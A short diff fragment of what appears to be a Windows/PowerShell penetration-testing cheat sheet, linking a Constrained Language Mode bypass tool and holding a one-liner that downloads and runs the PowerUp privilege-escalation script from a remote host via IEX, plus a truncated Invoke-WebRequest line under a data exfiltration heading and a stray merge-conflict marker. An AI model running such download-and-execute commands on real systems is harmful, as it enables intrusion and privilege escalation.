@@ -13,7 +13,6 @@
 
 Bypass of CLM : https://github.com/padovah4ck/PSByPassCLM
 
-
 ## Data exfiltration :
 
 ```
@@ -42,4 +41,8 @@ Invoke-Command -Credential $cred -ComputerName . -ScriptBlock {Invoke-WebRequest
 
 ```
 IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerSploit/Privesc/PowerUp.ps1')
+=======
+Credential use :
+
 ```
+
